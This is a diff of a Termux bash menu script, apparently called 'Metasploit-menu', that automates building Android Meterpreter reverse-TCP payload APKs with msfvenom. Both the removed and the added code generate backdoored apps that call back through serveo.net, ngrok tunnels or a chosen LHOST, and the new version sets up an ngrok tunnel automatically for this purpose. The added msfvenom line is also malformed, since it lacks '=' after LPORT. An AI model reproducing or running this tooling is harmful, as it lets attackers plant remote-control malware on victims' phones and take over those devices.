@@ -1,314 +1,189 @@
-fol() {
-	cd ~/Metasploit-menu
+bin() {
+	cd $PREFIX/bin
 	}
-	serveo () {
-	clear
-	ll="e"
-	i="c"
-	k="h"
-	h="o"
-	o="-e"
-	lal="\033[91m"
-	ajib_me="\033[96m"
-	pila="\033[93m"
-	na="-n"
-	image="figlet"
-	mar_jao="sleep"
-	pta_nhi="\033[95m"
-	bulu="\033[94m"
-	rang="toilet -f term -F gay"
-	$image Ngrok | $rang
-	$ll$i$k$h
-	$ll$i$k$h $o $na "$ajib_me Enter LPORT ( default :- 4564 ) :-  "
-	read kr_lo
-	if [ ! -z $kr_lo ];then
-	$ll$i$k$h $o " $lal [+] $pila Please wait Creating payload"
-	msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$kr_lo R > /sdcard/Payload/serveo-payload.apk
-	fi
-	printf "\n\n $hara [√] Successfully created payload in /sdcard/Payload\n\n"
-	$mar_jao 2
-	printf "$bulu [+] $pila Checking payload......\n\n\n"
-	cd /sdcard/Payload
-	echo -e "\033[95m"
-	pwd
-	echo
-	echo -e "\033[96m"
-	ls
-	printf "\n\n$pta_nhi Press enter to back"
-	read
-	payload
-	}
-	without () {
-		clear
-		printf "\n\n\033[92m Creating payload......\n"
-		msfvenom -p android/meterpreter/reverse_tcp R > /sdcard/Payload/without-Lhost-Lport-payload.apk
-		printf "\n\n\033[96m [√] Successfully Create payload in /sdcard/Payload\n\n"
-		printf "Press enter to back"
-		read
-		payload
+	fix() {
+		apt --fix-broken install
 		}
-		ips () {
-	clear
-	ll="e"
-	i="c"
-	k="h"
-	h="o"
-	o="-e"
-	lal="\033[91m"
-	ajib_me="\033[96m"
-	pila="\033[93m"
-	na="-n"
-	image="figlet"
-	mar_jao="sleep"
-	pta_nhi="\033[95m"
-	bulu="\033[94m"
-	rang="toilet -f term -F gay"
-	$image Ip | $rang
-	$ll$i$k$h
-	$ll$i$k$h $o $na "$ajib_me Enter LPORT ( default :- 4444 ) :-  "
-	read kr_lo
-	if [ ! -z $kr_lo ];then
-	echo
-	zz="$hara Your Ip :- "
-	$ll$i$k$h $o "$zz"
-	curl ifconfig.me
-	echo
-	$ll$i$k$h $o $na "$ajib_me Enter LHOST :- "
-	fi
-	read v_dalo
-	if [ $v_dalo ];then
-	$ll$i$k$h $o " $lal [+] $pila Please wait Creating payload"
-	msfvenom -p android/meterpreter/reverse_tcp LHOST=$v_dalo LPORT=$kr_lo R > /sdcard/Payload/ip-payload.apk
-	fi
-	printf "\n\n $hara [√] Successfully created payload in /sdcard/Payload\n\n"
-	$mar_jao 2
-	printf "$bulu [+] $pila Checking payload......\n\n\n"
-	cd /sdcard/Payload
-	echo -e "\033[95m"
-	pwd
-	echo
-	echo -e "\033[96m"
-	ls
-	printf "\n\n$pta_nhi Press enter to back"
-	read
-	payload
-	}
-
-ngrok () {
-	clear
-	ll="e"
-	i="c"
-	k="h"
-	h="o"
-	o="-e"
-	lal="\033[91m"
-	ajib_me="\033[96m"
-	pila="\033[93m"
-	na="-n"
-	image="figlet"
-	mar_jao="sleep"
-	pta_nhi="\033[95m"
-	bulu="\033[94m"
-	rang="toilet -f term -F gay"
-	$image Ngrok | $rang
-	$ll$i$k$h
-	$ll$i$k$h $o $na "$ajib_me Enter LPORT :-  "
-	read kr_lo
-	if [ ! -z $kr_lo ];then
-	$ll$i$k$h $o " $lal [+] $pila Please wait Creating payload"
-	msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$kr_lo R > /sdcard/Payload/ngrok-payload.apk
-	fi
-	printf "\n\n $hara [√] Successfully created payload in /sdcard/Payload\n\n"
-	$mar_jao 2
-	printf "$bulu [+] $pila Checking payload......\n\n\n"
-	cd /sdcard/Payload
-	echo -e "\033[95m"
-	pwd
-	echo
-	echo -e "\033[96m"
-	ls
-	printf "\n$pta_nhi Press enter to back"
-	read
-	payload
-	}
-	p-p() {
-		fol
-		bash python.sh
-		}
-		ph-p() {
-			fol
-			bash php.sh
-			}
-	payload () {
-		clear
-	ll="e"
-	i="c"
-	k="h"
-	h="o"
-	o="-e"
-	lal="\033[91m"
-	ajib_me="\033[96m"
-	pila="\033[93m"
-	na="-n"
-	image="figlet"
-	rang="toilet -f term -F gay"
-	$image Payload | $rang
-	$ll$i$k$h
-	aa="	$lal [ 1 ]$pila Using Ngrok"
-	bb="	$lal [ 2 ]$pila Using serveo.net"
-	cc="	$lal [ 3 ]$pila Using Ip"
-	ccc="	$lal [ 4 ]$pila Without LHOST and LPORT"
-	dd="	$lal [ 7 ]$pila Home"
-	ee="	$lal [ 8 ]$pila Exit"
-	ddd="	$lal [ 5 ]$pila python payload"
-	eee="	$lal [ 6 ]$pila php payload"
-	$ll$i$k$h $o "$aa"
-	$ll$i$k$h $o "$bb"
-	$ll$i$k$h $o "$cc"
-	$ll$i$k$h $o "$ccc"
-	$ll$i$k$h $o "$ddd"
-	$ll$i$k$h $o "$eee"
-	$ll$i$k$h $o "$dd"
-	$ll$i$k$h $o "$ee"
-	$ll$i$k$h
-	$ll$i$k$h $o $na "$ajib_me Select >> "
-	read v_kro
-	case $v_kro in
-	1)ngrok ;;
-	2)serveo ;;
-	3)ips ;;
-	4)without ;;
-	5)p-p ;;
-	6)ph-p ;;
-	7)msf-s ;;
-	8)exit 0
-	esac
-	}
-metasploit () {
-	msfconsole
-	}
-	port () {
-		ll="e"
-		i="c"
-		k="h"
-		h="o"
-		o"-e"
-		na"-n"
-		$ll$i$k$h $o $na "$ajib Enter Port Number :- "
-		read kro
-		if [ $kro ];then
-		ssh -R $kro:localhost:$kro serveo.net
+		rcheck () {
+			bin
+		if [ -e random ];then
+		printf "\n\033[1;92m [√] Installed random. \n"
+		else
+		printf "\n\033[1;92m [+] Installing random..\n"
+		cd ~
+		fix
+		cd ~/Metasploit-menu
+		dpkg -i random.deb
 		fi
 		}
-		post () {
-			pg_ctl -D $PREFIX/var/lib/postgresql start
-			}
-			cd $PREFIX/bin
-			if [ -e msfvenom ];then
+		fontcheck() {
+			if [ -e $PREFIX/share/figlet/font.flf ];then
 			echo
-			sleep 2
 			else
-			printf "\033[91m Please install metasploit !!!"
-			exit 0
-			fi
-			cd $PREFIX/bin
-			if [ -e msf-s ];then
-			echo -e "\033[93m Successfully installed"
-			else
-			ll="e"
-			i="c"
-			k="h"
-			h="o"
-			o="-e"
-			lal="\033[91m"
-			bulu="\033[94m"
-			pila="\033[93m"
-			hara="\033[92m"
-			ajib="\033[96m"
-			pta="\033[96m"
-			mm="$lal	 [+]$hara Updating....."
-			nn="$bulu	 [+]$pila Requirements found"
-			oo="$pila	 [+]$bulu Installing toilet"
-			pp="$hara	 [+]$ajib Installing figlet"
-			qq="$ajib	 [+]$pta Installing curl"
-			rr="$pta 	[+]$lal Install msf-s command"
-			maro="sleep"
-			kya="apt"
-			smjhe="update"
-			hoga="apt install"
-			saf="clear"
-			nhi="upgrade"
-			$ll$i$k$h $o "$nn"
-			$maro 1
-			$ll$i$k$h $o "$mm"
-			$maro 1
-			$kya $smjhe
-			$kya $nhi
-			mkdir -p $PREFIX/var/lib/postgresql
-initdb $PREFIX/var/lib/postgresql
-termux-setup-storage
-mkdir /sdcard/Payload
-			$saf
-				$ll$i$k$h $o "$oo"
-			$maro 1
-			$hoga toilet
-			$saf
-			$ll$i$k$h $o "$pp"
-			$maro 1
-			$hoga figlet
-			$saf
-			$ll$i$k$h $o "$qq"
-			$maro 1
-			$hoga curl
-			$saf
-			$ll$i$k$h $o "$rr"
-			$maro 1
 			cd ~/Metasploit-menu
-			cp -f msf-s $PREFIX/bin
-			chmod 777 $PREFIX/bin/msf-s
-			rm -f msf-s
-			$saf
-			$ll$i$k$h $o "$hara Now u can use this commamnd :- msf-s"
-			echo
-			$ll$i$k$h $o "$pila Press Enter to start"
-			read
-			msf-s
+			dpkg -i font.deb
 			fi
-			
-			
-			
-clear
-rangila="toilet -f term -F gay"
-figlet Metasploit | $rangila
-figlet menu | $rangila
-ll="e"
-i="c"
-k="h"
-h="o"
-o="-e"
-pila="\033[93m"
-lal="\033[91m"
-kya="$pila Select >> "
-na="-n"
-hara="\033[92m"
-aa="	$lal [ 1 ]$hara Create payload"
-bb="	$lal [ 2 ]$hara Start port forwarding"
-cc="	$lal [ 2 ]$hara Start Postgresql"
-dd="	$lal [ 3 ]$hara Start Metasploit"
-ee="	$lal [ 4 ]$hara Exit"
-$ll$i$k$h
-$ll$i$k$h $o "$aa"
-#$ll$i$k$h $o "$bb"
-$ll$i$k$h $o "$cc"
-$ll$i$k$h $o "$dd"
-$ll$i$k$h $o "$ee"
-$ll$i$k$h
-$ll$i$k$h $o $na "$kya"
-read kro
-case $kro in
-1)payload ;;
-2)port ;;
-3)post ;;
-4)metasploit ;;
-5)exit 0
-esac
+			}
+		ngcheck () {
+			bin
+		if [ -e ngrok ];then
+		printf "\n\033[1;92m [√] Installed ngrok \n\n"
+		else
+		printf "\n\033[1;92m [+] Installing ngrok..\n"
+		cd ~
+		fix
+		wget https://github.com/rooted-cyber/Ngrok-All-Version/raw/main/ngrok-2.2.9-linux-arm64.zip
+		unzip ngrok*
+		cp ngrok $PREFIX/bin
+		chmod 700 $PREFIX/bin/ngrok
+		fi
+		
+		}
+	pcheck () {
+		rcheck
+		bin
+		if [ -e toilet ];then
+		printf "\n\033[1;92m [√] Installed toilet. \n"
+		else
+		printf "\n\033[1;92m [+] Installing toilet..\n"
+		cd ~
+		fix
+		apt download toilet
+		dpkg -i toilet*
+		fi
+		bin
+		if [ -e figlet ];then
+		printf "\n\033[1;92m [√] Installed figlet. \n"
+		else
+		printf "\n\033[1;92m [+] Installing figlet..\n"
+		cd ~
+		fix
+		apt download figlet
+		dpkg -i figlet*
+		fi
+		bin
+		if [ -e wget ];then
+		printf "\n\033[1;92m [√] Installed wget. \n"
+		else
+		printf "\n\033[1;92m [+] Installing wget..\n"
+		cd ~
+		fix
+		apt download wget
+		dpkg -i wget*
+		fi
+		clear
+		}
+	banner() {
+		pcheck
+		fontcheck
+	toilet -f font.flf -F metal -f term Metasploit
+	toilet -f font.flf -F metal Menu
+	printf "\n\n\033[1;93mCreated by :\033[0m https://github.com/rooted-cyber/\n\n"
+	}
+	folder() {
+		cd ~/Metasploit-menu
+		}
+	check() {
+		if [ -e $PREFIX/bin/msfvenom ];then
+		echo
+		else
+		printf "\n\n\033[1;91m [×]\033[1;93m First install Metasploit !!!\n\n"
+		exit
+		fi
+		}
+		fcheck() {
+			if [ -e /sdcard/Payload ];then
+			echo
+			else
+			cd /sdcard
+			termux-setup-storage
+			mkdir Payload
+			fi
+			}
+		
+		
+		
+		
+		start() {
+			check
+			msfconsole
+			}
+				ng() {
+					pcheck
+					ngcheck
+					printf "\033[1;93m[+]\033[1;92m Starting Ngrok Server...\n"
+					killall -2 ngrok > /dev/null 2>&1
+					ngrok tcp 4444 > /dev/null 2>&1 &
+					sleep 12
+					link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "tcp://[0-9]*\.tcp\.ngrok\.io:[0-9]*")
+					if [ -z $link ];then
+					printf "\n\033[1;91m[×]\033[1;93m Try again !!!\n\n"
+					echo
+					toilet -f font -F metal Exiting
+					exit
+					fi
+					printf "\033[1;93m[+]\033[1;92m Your LHOST and LPORT : \033[1;93m$link\n\n"
+					echo -e "\033[1;92m"
+					echo -en " Enter above LHOST\033[0m "
+					read ab
+					if [ $ab ];then
+					echo
+					echo -en "\033[1;92m Enter above LPORT\033[0m "
+					read bc
+					fi
+					if [ $bc ];then
+					
+					echo
+					sleep 2
+					printf "\033[1;92m Please wait .. Creating Your payload\n\n"
+					msfvenom -p android/meterpreter/reverse_tcp LHOST=$ab LPORT $bc R > /sdcard/Payload/Ngrok-Payload.apk
+					fi
+					echo
+					toilet -f font -F metal Exiting
+					}
+					py() {
+						folder
+						bash python.sh
+						}
+						ph() {
+							folder
+							bash php.sh
+							}
+			payload() {
+				clear
+				check
+				fcheck
+				toilet -f font -F metal Payload
+				toilet -f font -F metal Menu
+				printf "\n\033[1;92m[\033[0m1\033[1;92m]\033[1;93m Normal payload\n"
+				printf "\033[1;92m[\033[0m2\033[1;92m]\033[1;93m python payload\n"
+				printf "\033[1;92m[\033[0m3\033[1;92m]\033[1;93m php payload\n"
+				printf "\033[1;92m[\033[0m4\033[1;92m]\033[1;93m Ngrok payload\n\n\n"
+				
+				echo -e -n "\033[1;93mPayload\033[1;96m ➤\033[0m "
+				read f
+				case $f in
+				1)normal ;;
+				2)py ;;
+				3)ph ;;
+				4)ng ;;
+				*)payload ;;
+				esac
+				}
+				
+	menu () {
+		banner
+		printf "\033[1;92m[\033[0m1\033[1;92m]\033[1;96m Create payload\n"
+		printf "\033[1;92m[\033[0m2\033[1;92m]\033[1;96m Start Metasploit\n"
+		printf "\033[1;92m[\033[0m3\033[1;92m]\033[1;96m Exit\n\n\n"
+		echo -e -n "\033[1;93mMetasploit\033[1;96m ➤\033[0m "
+		read b
+		case $b in
+		1)payload ;;
+		2)start ;;
+		3)ep ;;
+		*)menu ;;
+		esac
+		}
+		menu
+		
